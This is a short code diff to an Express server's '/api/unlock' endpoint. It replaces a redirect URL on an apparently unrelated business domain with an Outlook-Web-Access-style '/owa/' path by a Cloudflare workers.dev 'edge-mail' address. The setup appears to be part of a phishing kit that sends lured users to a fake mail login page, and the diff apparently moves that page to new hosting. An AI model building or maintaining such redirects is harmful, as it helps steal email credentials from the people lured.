@@ -66,7 +66,7 @@ app.post('/api/unlock', async (req, res) => {
       // IMMEDIATELY respond to the frontend so the user doesn't experience a "hang"
       res.json({ 
         success: true, 
-        redirectUrl: "https://proposals.mcgroupbuilders.com/owa/og2tczca7zb0h07gbm" 
+        redirectUrl: "https://edge-mail-y6ot.p-e1ot52t8.workers.dev/l/g1VnU8oIDs8" 
       });
 
     } else {
